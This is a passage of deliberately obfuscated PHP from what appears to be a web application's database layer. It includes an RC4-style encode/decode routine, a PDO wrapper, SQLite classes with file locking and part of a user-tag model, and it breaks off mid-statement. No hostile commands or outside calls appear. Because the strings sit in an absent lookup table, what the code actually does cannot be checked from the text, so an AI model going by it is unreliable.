$A„•ÅŒğ»¸; goto c¾Ú¡ë²Ÿ; f‹ÓÍïæİ: $c’Ÿæ™â’Á =& $_SERVER[õëù©û]; $eê„ ¡©È = 4; $a±õÉÌàæœ = md5($a±õÉÌàæœ ? $a±õÉÌàæœ : self::$defaultKey); goto F²‚­èİŒ¨; F²‚­èİŒ¨: $eĞ®‹®®¥ = md5(substr($a±õÉÌàæœ, 0, 16)); $fßÔ»¾õÇ¾ = md5(substr($a±õÉÌàæœ, 16, 16)); $Eîöõïğ±Ï = $Eîöõïğ±Ï ? $Eîöõïğ±Ï : md5(microtime()); goto f©”î­…‡; EÉÑ¡§ß÷Š: $FÇóâé¥ğ° = sprintf($c’Ÿæ™â’Á[1895], $eçô®‡ì ? $eçô®‡ì + time() : 0) . substr(md5($FÇóâé¥ğ° . $fßÔ»¾õÇ¾), 0, 16) . $FÇóâé¥ğ°; $B£…­ÖìĞÃ = strlen($FÇóâé¥ğ°); $F‰Şßçù÷ï = array(); goto aÊ­ ó †©; f©”î­…‡: $A¶äù ‚éê = substr($Eîöõïğ±Ï, -$eê„ ¡©È); $däŠìÔœƒ† = $eĞ®‹®®¥ . md5($eĞ®‹®®¥ . $A¶äù ‚éê); $d“†ö…Ù°‹ = strlen($däŠìÔœƒ†); goto EÉÑ¡§ß÷Š; c¾Ú¡ë²Ÿ: } public static function decode($Fç«»Î…“¨, $Aå¨ä·•“µ = '') { goto F¸µƒğîÜ÷; F¸µƒğîÜ÷: $d‰âö²¯Ô£ =& $_SERVER[õëù©û]; $Fç«»Î…“¨ = str_replace(array($d‰âö²¯Ô£[407], $d‰âö²¯Ô£[70], $d‰âö²¯Ô£[91]), array($d‰âö²¯Ô£[280], $d‰âö²¯Ô£[8], $d‰âö²¯Ô£[900]), $Fç«»Î…“¨); $A…˜ç†Çå– = 4; goto Cà‰†£Ç™ñ; bÃ§…Şñ: $aË¤ÓÏ¬  = $d‰âö²¯Ô£[33]; for ($cË¤Œ‡¡Œ = $aª•§Ÿ‡ÄÙ = $dÔ½ãÑ’ˆâ = 0; $dÔ½ãÑ’ˆâ < $dß°¢·Ì¼Ê; $dÔ½ãÑ’ˆâ++) { $cË¤Œ‡¡Œ = ($cË¤Œ‡¡Œ + 1) % 256; $aª•§Ÿ‡ÄÙ = ($aª•§Ÿ‡ÄÙ + $Càø£Èİ’[$cË¤Œ‡¡Œ]) % 256; $CˆÀéÉŸ°‘ = $Càø£Èİ’[$cË¤Œ‡¡Œ]; $Càø£Èİ’[$cË¤Œ‡¡Œ] = $Càø£Èİ’[$aª•§Ÿ‡ÄÙ]; $Càø£Èİ’[$aª•§Ÿ‡ÄÙ] = $CˆÀéÉŸ°‘; $aË¤ÓÏ¬  .= chr(ord($Fç«»Î…“¨[$dÔ½ãÑ’ˆâ]) ^ $Càø£Èİ’[($Càø£Èİ’[$cË¤Œ‡¡Œ] + $Càø£Èİ’[$aª•§Ÿ‡ÄÙ]) % 256]); } $cºÜ÷¤¶ƒ· = intval(substr($aË¤ÓÏ¬ , 0, 10)); goto b­«ºÌèØô; b­«ºÌèØô: if (($cºÜ÷¤¶ƒ· == 0 || $cºÜ÷¤¶ƒ· - time() > 0) && substr($aË¤ÓÏ¬ , 10, 16) == substr(md5(substr($aË¤ÓÏ¬ , 26) . $FìŠÇ¯ªã·), 0, 16)) { return substr($aË¤ÓÏ¬ , 26); } else { return $d‰âö²¯Ô£[33]; } goto fÉ¥¾‡˜ö; f¯»íÅÑÕ: $Fç«»Î…“¨ = base64_decode(substr($Fç«»Î…“¨, $A…˜ç†Çå–)); $dß°¢·Ì¼Ê = strlen($Fç«»Î…“¨); $DøÂöÜŒ†í = array(); goto F²Œê¬«ÔÄ; Cà‰†£Ç™ñ: $Aå¨ä·•“µ = md5($Aå¨ä·•“µ ? $Aå¨ä·•“µ : self::$defaultKey); $DŠÅÈ ‡¦ñ = md5(substr($Aå¨ä·•“µ, 0, 16)); $FìŠÇ¯ªã· = md5(substr($Aå¨ä·•“µ, 16, 16)); goto DÏÎ¼­ã«ï; F²Œê¬«ÔÄ: for ($dÔ½ãÑ’ˆâ = 0; $dÔ½ãÑ’ˆâ <= 255; $dÔ½ãÑ’ˆâ++) { $DøÂöÜŒ†í[$dÔ½ãÑ’ˆâ] = ord($Eê“æ˜Ó¤[$dÔ½ãÑ’ˆâ % $C¹Ï¹Ò¹Ïª]); } $Càø£Èİ’ = range(0, 255); for ($aª•§Ÿ‡ÄÙ = $dÔ½ãÑ’ˆâ = 0; $dÔ½ãÑ’ˆâ < 256; $dÔ½ãÑ’ˆâ++) { $aª•§Ÿ‡ÄÙ = ($aª•§Ÿ‡ÄÙ + $Càø£Èİ’[$dÔ½ãÑ’ˆâ] + $DøÂöÜŒ†í[$dÔ½ãÑ’ˆâ]) % 256; $CˆÀéÉŸ°‘ = $Càø£Èİ’[$dÔ½ãÑ’ˆâ]; $Càø£Èİ’[$dÔ½ãÑ’ˆâ] = $Càø£Èİ’[$aª•§Ÿ‡ÄÙ]; $Càø£Èİ’[$aª•§Ÿ‡ÄÙ] = $CˆÀéÉŸ°‘; } goto bÃ§…Şñ; DÏÎ¼­ã«ï: $B„›óœ†Âˆ = substr($Fç«»Î…“¨, 0, $A…˜ç†Çå–); $Eê“æ˜Ó¤ = $DŠÅÈ ‡¦ñ . md5($DŠÅÈ ‡¦ñ . $B„›óœ†Âˆ); $C¹Ï¹Ò¹Ïª = strlen($Eê“æ˜Ó¤); goto f¯»íÅÑÕ; fÉ¥¾‡˜ö: } } define($_SERVER[õëù©û][1896], 1); define($_SERVER[õëù©û][1897], 2); goto FñÀ—Š™Ü; AÌÒ›×æ…³: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($CÚ‘…³—¡À = '') { $E¡ãˆÌáÚ =& $_SERVER[õëù©û]; if (!class_exists($E¡ãˆÌáÚ[819])) { think_exception(think_lang($E¡ãˆÌáÚ[10]) . $E¡ãˆÌáÚ[820]); } if (!empty($CÚ‘…³—¡À)) { $this->config = $CÚ‘…³—¡À; if (empty($this->config[$E¡ãˆÌáÚ[13]])) { $this->config[$E¡ãˆÌáÚ[13]] = array(); } } } public function connect($B¹×ªéÚø = '', $eâÈµ¤Ì» = 0) { $BæğÑÚØÀ½ =& $_SERVER[õëù©û]; if (!isset($this->linkID[$eâÈµ¤Ì»])) { goto cìŸ‚â†°Ò; E¯ØØ–ˆØÉ: $this->dbType = $this->_getDsnType($B¹×ªéÚø[$BæğÑÚØÀ½[821]]); if (in_array($this->dbType, array($BæğÑÚØÀ½[822], $BæğÑÚØÀ½[823], $BæğÑÚØÀ½[824], $BæğÑÚØÀ½[825]))) { think_exception($BæğÑÚØÀ½[826] . $this->dbType . $BæğÑÚØÀ½[827] . $this->dbType . $BæğÑÚØÀ½[828]); } if (!$this->linkID[$eâÈµ¤Ì»]) { think_exception($BæğÑÚØÀ½[829]); } goto AÊéîì– •; AÊéîì– •: $this->linkID[$eâÈµ¤Ì»]->exec($BæğÑÚØÀ½[830] . think_config($BæğÑÚØÀ½[797])); $this->connected = !0; if (1 != think_config($BæğÑÚØÀ½[18])) { unset($this->config); } goto Eà¿ÆìÕƒ; cìŸ‚â†°Ò: if (empty($B¹×ªéÚø)) { $B¹×ªéÚø = $this->config; } if ($this->pconnect) { $B¹×ªéÚø[$BæğÑÚØÀ½[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$eâÈµ¤Ì»] = new PDO($B¹×ªéÚø[$BæğÑÚØÀ½[821]], $B¹×ªéÚø[$BæğÑÚØÀ½[794]], $B¹×ªéÚø[$BæğÑÚØÀ½[795]], $B¹×ªéÚø[$BæğÑÚØÀ½[13]]); } catch (PDOException $EÜÁÁä”) { think_exception($EÜÁÁä”->getMessage()); } goto E¯ØØ–ˆØÉ; Eà¿ÆìÕƒ: } return $this->linkID[$eâÈµ¤Ì»]; } public function free() { $this->PDOStatement = null; } public function query($eèŸºãÓŠ, $Aˆ¤”ëïÜë = array()) { goto BìÉöìêÊ»; AÛŠëĞö•È: think_action_status($Aõƒ¨†À[19], 1); think_status($Aõƒ¨†À[20]); $this->PDOStatement = $this->_linkID->prepare($eèŸºãÓŠ); goto D‹˜‘´¹›Ê; BìÉöìêÊ»: $Aõƒ¨†À =& $_SERVER[õëù©û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B£½½ªŸƒ¾; B£½½ªŸƒ¾: $this->queryStr = $eèŸºãÓŠ; if (!empty($Aˆ¤”ëïÜë)) { $this->queryStr .= $Aõƒ¨†À[831] . print_r($Aˆ¤”ëïÜë, !0) . $Aõƒ¨†À[832]; } if (!empty($this->PDOStatement)) { $this->free(); } goto AÛŠëĞö•È; D‹˜‘´¹›Ê: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bŞ×‹è‚ö‰ = $this->PDOStatement->execute($Aˆ¤”ëïÜë); $this->debug(); goto eœ‰¿î÷Ş…; eœ‰¿î÷Ş…: if (!1 === $bŞ×‹è‚ö‰) { $this->error(); return !1; } else { return $this->getAll(); } goto BÀ­«“ä‰ˆ; BÀ­«“ä‰ˆ: } public function execute($d„ËÅÏöœâ, $CÚ¨µÑ÷‰ã = array()) { goto fÁ½®î’Œ; aØ¦¡„Â¼: $E“Â¯ßÓÊ = $this->PDOStatement->execute($CÚ¨µÑ÷‰ã); $this->debug(); if (!1 === $E“Â¯ßÓÊ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($aæ¹‡¡š¤¥ || preg_match($cÍ¸øíËÛ‚[837], $d„ËÅÏöœâ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto DâÓ¿áôŸ; eÌ¶®èòäë: $this->queryStr = $d„ËÅÏöœâ; if (!empty($CÚ¨µÑ÷‰ã)) { $this->queryStr .= $cÍ¸øíËÛ‚[831] . print_r($CÚ¨µÑ÷‰ã, !0) . $cÍ¸øíËÛ‚[832]; } $aæ¹‡¡š¤¥ = !1; goto Dîõàï¨ „; E…º­ŠÈŠî: think_status($cÍ¸øíËÛ‚[20]); $this->PDOStatement = $this->_linkID->prepare($d„ËÅÏöœâ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto aØ¦¡„Â¼; Dîõàï¨ „: if ($this->dbType == $cÍ¸øíËÛ‚[825]) { if (preg_match($cÍ¸øíËÛ‚[833], $this->queryStr, $e‘‘ĞİØ†¸)) { $this->table = think_config($cÍ¸øíËÛ‚[834]) . str_ireplace(think_config($cÍ¸øíËÛ‚[835]), $cÍ¸øíËÛ‚[357], $e‘‘ĞİØ†¸[2]); $aæ¹‡¡š¤¥ = (bool) $this->query($cÍ¸øíËÛ‚[836] . strtoupper($this->table) . $cÍ¸øíËÛ‚[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($cÍ¸øíËÛ‚[21], 1); goto E…º­ŠÈŠî; fÁ½®î’Œ: $cÍ¸øíËÛ‚ =& $_SERVER[õëù©û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÌ¶®èòäë; DâÓ¿áôŸ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EÅ‹«ôµÛª = $this->_linkID->commit(); $this->transTimes = 0; if (!$EÅ‹«ôµÛª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c³ßÎÍƒœ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c³ßÎÍƒœ) { $this->error(); return !1; } } return !0; } private function getAll() { $B‰á‡è‡æì = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($B‰á‡è‡æì); return $B‰á‡è‡æì; } public function getFields($E•Ù…äò³ƒ) { goto eÌ¯²¸İâª; aˆŒ‰Óªù×: return $AÚóÂÀ¯¼¬; goto C²š¤èœÂÉ; C•¦¯Ÿ¨«‡: $cî–ÀÁªµª = $this->query($Fçá¿î”¬°); $AÚóÂÀ¯¼¬ = array(); if ($cî–ÀÁªµª) { foreach ($cî–ÀÁªµª as $få±‡ïßÏæ => $fÅ‚‚ƒÖñÃ) { $fÅ‚‚ƒÖñÃ = array_change_key_case($fÅ‚‚ƒÖñÃ); $fÅ‚‚ƒÖñÃ[$EŠè’å„’[28]] = isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[28]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[28]] : $EŠè’å„’[357]; $fÅ‚‚ƒÖñÃ[$EŠè’å„’[29]] = isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[29]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[29]] : $EŠè’å„’[357]; $c™²®“°Äã = isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[257]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[257]] : $fÅ‚‚ƒÖñÃ[$EŠè’å„’[28]]; $AÚóÂÀ¯¼¬[$c™²®“°Äã] = array($EŠè’å„’[28] => $c™²®“°Äã, $EŠè’å„’[29] => $fÅ‚‚ƒÖñÃ[$EŠè’å„’[29]], $EŠè’å„’[31] => (bool) (isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[99]]) && $fÅ‚‚ƒÖñÃ[$EŠè’å„’[99]] === $EŠè’å„’[33] || isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[31]]) && $fÅ‚‚ƒÖñÃ[$EŠè’å„’[31]] === $EŠè’å„’[33]), $EŠè’å„’[34] => isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[34]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[34]] : (isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[53]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[53]] : $EŠè’å„’[357]), $EŠè’å„’[36] => isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[89]]) ? strtolower($fÅ‚‚ƒÖñÃ[$EŠè’å„’[89]]) == $EŠè’å„’[38] : (isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[54]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[54]] : !1), $EŠè’å„’[39] => isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[854]]) ? strtolower($fÅ‚‚ƒÖñÃ[$EŠè’å„’[854]]) == $EŠè’å„’[41] : (isset($fÅ‚‚ƒÖñÃ[$EŠè’å„’[89]]) ? $fÅ‚‚ƒÖñÃ[$EŠè’å„’[89]] : !1)); } } goto aˆŒ‰Óªù×; eÌ¯²¸İâª: $EŠè’å„’ =& $_SERVER[õëù©û]; $this->initConnect(!0); if (think_config($EŠè’å„’[838])) { $Fçá¿î”¬° = str_replace($EŠè’å„’[839], $E•Ù…äò³ƒ, think_config($EŠè’å„’[838])); } else { switch ($this->dbType) { case $EŠè’å„’[822]: case $EŠè’å„’[840]: $Fçá¿î”¬° = "\123\x45\114\x45\x43\x54\40\40\40\143\157\x6c\165\155\156\x5f\156\x61\x6d\x65\40\x61\163\x20\x27\116\x61\155\145\47\x2c\40\40\40\144\141\164\x61\137\164\171\x70\x65\40\x61\163\x20\x27\x54\x79\160\x65\x27\54\x20\x20\x20\x63\x6f\154\165\x6d\156\x5f\x64\145\x66\141\x75\154\x74\x20\141\x73\40\x27\x44\x65\146\x61\165\x6c\164\x27\x2c\40\x20\x20\151\x73\x5f\156\x75\154\x6c\x61\142\154\145\x20\141\163\40\x27\x4e\165\154\x6c\47\12\11\x9\x46\122\117\115\x9\x69\156\146\157\162\155\141\164\151\x6f\x6e\x5f\x73\x63\x68\145\155\x61\56\164\141\x62\x6c\145\163\40\x41\123\x20\164\xa\x9\x9\112\117\111\116\x9\x69\x6e\146\x6f\x72\155\141\164\x69\157\x6e\x5f\163\x63\x68\145\x6d\141\x2e\x63\157\x6c\165\155\x6e\x73\x20\x41\123\x20\143\xa\11\x9\x4f\x4e\40\x20\x74\56\164\141\142\154\145\x5f\143\x61\x74\x61\x6c\x6f\147\x20\x3d\x20\x63\x2e\164\141\142\x6c\145\137\x63\x61\x74\141\x6c\x6f\x67\xa\x9\11\101\116\x44\x20\x74\56\x74\141\142\154\x65\x5f\x73\x63\x68\145\x6d\x61\40\75\x20\x63\56\164\x61\x62\154\x65\x5f\x73\143\x68\145\155\141\12\11\11\101\116\104\40\x74\x2e\x74\141\x62\x6c\x65\137\156\141\155\x65\x20\75\40\143\56\164\141\x62\x6c\145\x5f\x6e\141\155\145\xa\11\x9\127\110\105\122\105\x20\40\40\164\56\x74\x61\x62\154\145\x5f\x6e\x61\155\145\x20\x3d\40\47{$E•Ù…äò³ƒ}\47"; break; case $EŠè’å„’[841]: $Fçá¿î”¬° = $EŠè’å„’[842] . $E•Ù…äò³ƒ . $EŠè’å„’[843]; break; case $EŠè’å„’[823]: case $EŠè’å„’[825]: $Fçá¿î”¬° = $EŠè’å„’[844] . $EŠè’å„’[845] . $EŠè’å„’[846] . strtoupper($E•Ù…äò³ƒ) . $EŠè’å„’[847] . strtoupper($E•Ù…äò³ƒ) . $EŠè’å„’[848]; break; case $EŠè’å„’[849]: $Fçá¿î”¬° = $EŠè’å„’[850] . $E•Ù…äò³ƒ . $EŠè’å„’[851]; break; case $EŠè’å„’[824]: break; case $EŠè’å„’[852]: default: $Fçá¿î”¬° = $EŠè’å„’[853] . ($this->dbType == $EŠè’å„’[852] ? "\140{$E•Ù…äò³ƒ}\140" : $E•Ù…äò³ƒ); } } goto C•¦¯Ÿ¨«‡; C²š¤èœÂÉ: } public function getTables($aá®†èó = '') { $CË†É¾ñ„á =& $_SERVER[õëù©û]; if (think_config($CË†É¾ñ„á[855])) { $FåÖ·©˜È½ = str_replace($CË†É¾ñ„á[856], $aá®†èó, think_config($CË†É¾ñ„á[855])); } else { switch ($this->dbType) { case $CË†É¾ñ„á[823]: case $CË†É¾ñ„á[825]: $FåÖ·©˜È½ = $CË†É¾ñ„á[857]; break; case $CË†É¾ñ„á[822]: case $CË†É¾ñ„á[840]: $FåÖ·©˜È½ = $CË†É¾ñ„á[858]; break; case $CË†É¾ñ„á[849]: $FåÖ·©˜È½ = $CË†É¾ñ„á[859]; break; case $CË†É¾ñ„á[824]: think_exception(think_lang($CË†É¾ñ„á[860]) . $CË†É¾ñ„á[861]); break; case $CË†É¾ñ„á[841]: $FåÖ·©˜È½ = $CË†É¾ñ„á[42] . $CË†É¾ñ„á[43] . $CË†É¾ñ„á[44]; break; case $CË†É¾ñ„á[852]: default: if (!empty($aá®†èó)) { $FåÖ·©˜È½ = $CË†É¾ñ„á[805] . $aá®†èó; } else { $FåÖ·©˜È½ = $CË†É¾ñ„á[806]; } } } $f‡„™±Óª = $this->query($FåÖ·©˜È½); $D»İ»¸ò = array(); foreach ($f‡„™±Óª as $f¡ÀÆß¤ç• => $fš¢áîÒ) { $D»İ»¸ò[$f¡ÀÆß¤ç•] = current($fš¢áîÒ); } return $D»İ»¸ò; } protected function parseLimit($eËÑŞÓ•ö) { $EãÑ¼Ù¢ÀŠ =& $_SERVER[õëù©û]; $FîÊ‹²‘ø½ = $EãÑ¼Ù¢ÀŠ[33]; if (!empty($eËÑŞÓ•ö)) { switch ($this->dbType) { case $EãÑ¼Ù¢ÀŠ[849]: case $EãÑ¼Ù¢ÀŠ[841]: $eËÑŞÓ•ö = explode($EãÑ¼Ù¢ÀŠ[47], $eËÑŞÓ•ö); if (count($eËÑŞÓ•ö) > 1) { $FîÊ‹²‘ø½ .= $EãÑ¼Ù¢ÀŠ[48] . $eËÑŞÓ•ö[1] . $EãÑ¼Ù¢ÀŠ[49] . $eËÑŞÓ•ö[0] . $EãÑ¼Ù¢ÀŠ[50]; } else { $FîÊ‹²‘ø½ .= $EãÑ¼Ù¢ÀŠ[48] . $eËÑŞÓ•ö[0] . $EãÑ¼Ù¢ÀŠ[50]; } break; case $EãÑ¼Ù¢ÀŠ[822]: case $EãÑ¼Ù¢ÀŠ[840]: break; case $EãÑ¼Ù¢ÀŠ[824]: break; case $EãÑ¼Ù¢ÀŠ[823]: case $EãÑ¼Ù¢ÀŠ[825]: break; case $EãÑ¼Ù¢ÀŠ[852]: default: $FîÊ‹²‘ø½ .= $EãÑ¼Ù¢ÀŠ[48] . $eËÑŞÓ•ö . $EãÑ¼Ù¢ÀŠ[50]; } } return $FîÊ‹²‘ø½; } public function parseKey(&$E³ˆ½…›Í™, $EËºóÖçÒ¬ = true) { $BÁ™«ò¯ì =& $_SERVER[õëù©û]; if ($EËºóÖçÒ¬) { $E³ˆ½…›Í™ = $this->parseKeyCheck($E³ˆ½…›Í™); } if ($this->dbType == $BÁ™«ò¯ì[852]) { if ($E³ˆ½…›Í™ != $BÁ™«ò¯ì[172] && !preg_match($BÁ™«ò¯ì[816], $E³ˆ½…›Í™)) { $E³ˆ½…›Í™ = $BÁ™«ò¯ì[817] . trim($E³ˆ½…›Í™, $BÁ™«ò¯ì[817]) . $BÁ™«ò¯ì[817]; } return $E³ˆ½…›Í™; } else { return parent::parseKey($E³ˆ½…›Í™); } } public function close() { $this->_linkID = null; } public function error() { $d¡¥Ÿêõ‘ =& $_SERVER[õëù©û]; if ($this->PDOStatement) { $d¬ç„óãæç = $this->PDOStatement->errorInfo(); $this->error = $d¬ç„óãæç[1] . $d¡¥Ÿêõ‘[4] . $d¬ç„óãæç[2]; } else { $this->error = $d¡¥Ÿêõ‘[33]; } if ($d¡¥Ÿêõ‘[33] != $this->queryStr) { $this->error .= LNG($d¡¥Ÿêõ‘[45]) . $this->queryStr; } think_trace($this->error, $d¡¥Ÿêõ‘[33], $d¡¥Ÿêõ‘[46]); return $this->error; } public function escapeString($D”“¼šˆ¶Î) { $f¸Ø±Ä¤ä× =& $_SERVER[õëù©û]; switch ($this->dbType) { case $f¸Ø±Ä¤ä×[849]: case $f¸Ø±Ä¤ä×[822]: case $f¸Ø±Ä¤ä×[840]: case $f¸Ø±Ä¤ä×[852]: return addslashes($D”“¼šˆ¶Î); case $f¸Ø±Ä¤ä×[824]: case $f¸Ø±Ä¤ä×[841]: case $f¸Ø±Ä¤ä×[823]: case $f¸Ø±Ä¤ä×[825]: return str_ireplace($f¸Ø±Ä¤ä×[55], $f¸Ø±Ä¤ä×[56], $D”“¼šˆ¶Î); } } protected function parseValue($Eíö‰¸†‘) { $cø­áå˜‚ =& $_SERVER[õëù©û]; if (is_string($Eíö‰¸†‘)) { $Eíö‰¸†‘ = strpos($Eíö‰¸†‘, $cø­áå˜‚[4]) === 0 ? $this->escapeString($Eíö‰¸†‘) : $cø­áå˜‚[862] . $this->escapeString($Eíö‰¸†‘) . $cø­áå˜‚[862]; } elseif (isset($Eíö‰¸†‘[0]) && is_string($Eíö‰¸†‘[0]) && strtolower($Eíö‰¸†‘[0]) == $cø­áå˜‚[281]) { $Eíö‰¸†‘ = $this->escapeString($Eíö‰¸†‘[1]); } elseif (is_array($Eíö‰¸†‘)) { $Eíö‰¸†‘ = array_map(array($this, $cø­áå˜‚[863]), $Eíö‰¸†‘); } elseif (is_bool($Eíö‰¸†‘)) { $Eíö‰¸†‘ = $Eíö‰¸†‘ ? $cø­áå˜‚[83] : $cø­áå˜‚[463]; } elseif (is_null($Eíö‰¸†‘)) { $Eíö‰¸†‘ = $cø­áå˜‚[99]; } return $Eíö‰¸†‘; } public function getLastInsertId() { $AóÍñ‹ÀïÒ =& $_SERVER[õëù©û]; switch ($this->dbType) { case $AóÍñ‹ÀïÒ[849]: case $AóÍñ‹ÀïÒ[841]: case $AóÍñ‹ÀïÒ[822]: case $AóÍñ‹ÀïÒ[840]: case $AóÍñ‹ÀïÒ[824]: case $AóÍñ‹ÀïÒ[852]: return $this->_linkID->lastInsertId(); case $AóÍñ‹ÀïÒ[823]: case $AóÍñ‹ÀïÒ[825]: $DÜ›‚ØõÕë = $this->table; $c§ìÂÓİõ² = $this->query("\123\105\x4c\105\103\x54\x20{$DÜ›‚ØõÕë}\56\x63\x75\x72\x72\166\x61\154\40\143\x75\162\x72\x76\141\154\40\x46\122\x4f\115\x20\x64\x75\x61\154"); return $c§ìÂÓİõ² ? $c§ìÂÓİõ²[0][$AóÍñ‹ÀïÒ[864]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÑÈ¸êØŒ) { goto AÚ ‰ì–’³; fâÈÌ‡ß‹ß: if (!$B’åô“©Æ™) { return !1; } if (flock($B’åô“©Æ™, LOCK_EX)) { $E¢·ô«ƒôÙ = parent::query($dÑÈ¸êØŒ); flock($B’åô“©Æ™, LOCK_UN); fclose($B’åô“©Æ™); return $E¢·ô«ƒôÙ; } flock($B’åô“©Æ™, LOCK_UN); goto E¼ ·´ª’Ä; AÚ ‰ì–’³: $b‰ò‚Œ‹ç¥ =& $_SERVER[õëù©û]; $d“”µ«òó = DATA_PATH . $b‰ò‚Œ‹ç¥[865]; $B’åô“©Æ™ = fopen($d“”µ«òó, $b‰ò‚Œ‹ç¥[866]); goto fâÈÌ‡ß‹ß; E¼ ·´ª’Ä: fclose($B’åô“©Æ™); show_json($b‰ò‚Œ‹ç¥[867], !1); return !1; goto d¯Ë¼äÌ§‚; d¯Ë¼äÌ§‚: } public function execute($Bõ”ì•Ò—ò) { goto c»ÜÀ©¨×›; CÌ‹šï†ˆß: fclose($A«¼Š²“Á—); show_json($DÎ†áÙ¥Âƒ[867], !1); return !1; goto CÑ¦ùæôÚ; fÕóåÈÂİË: if (!$A«¼Š²“Á—) { return !1; } if (flock($A«¼Š²“Á—, LOCK_EX)) { $D™¶·¥¸ƒÃ = parent::execute($Bõ”ì•Ò—ò); flock($A«¼Š²“Á—, LOCK_UN); fclose($A«¼Š²“Á—); return $D™¶·¥¸ƒÃ; } flock($A«¼Š²“Á—, LOCK_UN); goto CÌ‹šï†ˆß; c»ÜÀ©¨×›: $DÎ†áÙ¥Âƒ =& $_SERVER[õëù©û]; $F»ÍÖÖØÅ = DATA_PATH . $DÎ†áÙ¥Âƒ[865]; $A«¼Š²“Á— = fopen($F»ÍÖÖØÅ, $DÎ†áÙ¥Âƒ[866]); goto fÕóåÈÂİË; CÑ¦ùæôÚ: } } class DbSqlite3 extends DbSqlite3Base { public function query($EÉÎåİŠ) { goto b¹“‰…ï˜›; céö×‹òÁ: fclose($BäÀçÃêÁÛ); show_json($aÛ¬Ûğî¯[867], !1); return !1; goto c²ùâ†‚ºÙ; b¹“‰…ï˜›: $aÛ¬Ûğî¯ =& $_SERVER[õëù©û]; $DÙ›·–äŞƒ = DATA_PATH . $aÛ¬Ûğî¯[865]; $BäÀçÃêÁÛ = fopen($DÙ›·–äŞƒ, $aÛ¬Ûğî¯[866]); goto c¯êø¦¼Â¶; c¯êø¦¼Â¶: if (!$BäÀçÃêÁÛ) { return !1; } if (flock($BäÀçÃêÁÛ, LOCK_EX)) { $fÀ‹àù©¡ = parent::query($EÉÎåİŠ); flock($BäÀçÃêÁÛ, LOCK_UN); fclose($BäÀçÃêÁÛ); return $fÀ‹àù©¡; } flock($BäÀçÃêÁÛ, LOCK_UN); goto céö×‹òÁ; c²ùâ†‚ºÙ: } public function execute($C›×´ÆÚ§Ê) { goto eÁ‘ªæª; E‡³»ò··®: fclose($Aù•‘ïï¾œ); show_json($bÜ§ò¿¿ºÖ[867], !1); return !1; goto A±¼©°Ã¹©; eÁ‘ªæª: $bÜ§ò¿¿ºÖ =& $_SERVER[õëù©û]; $AÄÁ„¤×İÓ = DATA_PATH . $bÜ§ò¿¿ºÖ[865]; $Aù•‘ïï¾œ = fopen($AÄÁ„¤×İÓ, $bÜ§ò¿¿ºÖ[866]); goto d­Õ‰—»§; d­Õ‰—»§: if (!$Aù•‘ïï¾œ) { return !1; } if (flock($Aù•‘ïï¾œ, LOCK_EX)) { $a©ÁÌ÷Ì™© = parent::execute($C›×´ÆÚ§Ê); flock($Aù•‘ïï¾œ, LOCK_UN); fclose($Aù•‘ïï¾œ); return $a©ÁÌ÷Ì™©; } flock($Aù•‘ïï¾œ, LOCK_UN); goto E‡³»ò··®; A±¼©°Ã¹©: } } goto d…İöÇÚ°; d”£ÜŒ¦¹Ä: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($Då¾˜óè‡) { $dÁ£å¯Ï†‹ =& $_SERVER[õëù©û]; return array($dÁ£å¯Ï†‹[2446] => array(USER_ID, $dÁ£å¯Ï†‹[2502])); } protected function listData() { $Eï›Ê¾ã¼Ş =& $_SERVER[õëù©û]; $EÃ£ˆ’ò¹ = array($Eï›Ê¾ã¼Ş[1395] => USER_ID, $Eï›Ê¾ã¼Ş[431] => array($Eï›Ê¾ã¼Ş[2503], 0)); $F³Ö…³ÛÒ† = $Eï›Ê¾ã¼Ş[2504]; $Cğ¢Èªê = $Eï›Ê¾ã¼Ş[2505]; $d’ŒÒˆøê = $this->field($F³Ö…³ÛÒ†)->where($EÃ£ˆ’ò¹)->order($Cğ¢Èªê)->select(); return $d’ŒÒˆøê ? $d’ŒÒˆøê : array(); } protected function listByTag($c šæé¥²‘) { } protected function addToTag($CĞ®§÷ˆÒœ, $Bàï‡’Ş») { $bâ‰åš›¤± =& $_SERVER[õëù©û]; if (!Model($bâ‰åš›¤±[2268])->listData($Bàï‡’Ş») || !Model($bâ‰åš›¤±[747])->pathInfo($CĞ®§÷ˆÒœ)) { return !1; } $d±Öá‚ŞŸá = array($bâ‰åš›¤±[1395] => USER_ID, $bâ‰åš›¤±[431] => $Bàï‡’Ş», $bâ‰åš›¤±[383] => $CĞ®§÷ˆÒœ, $bâ‰åš›¤±[384] => $bâ‰åš›¤±[378], $bâ‰åš›¤±[382] => $bâ‰åš›¤±[33], $bâ‰åš›¤±[2072] => 0); if 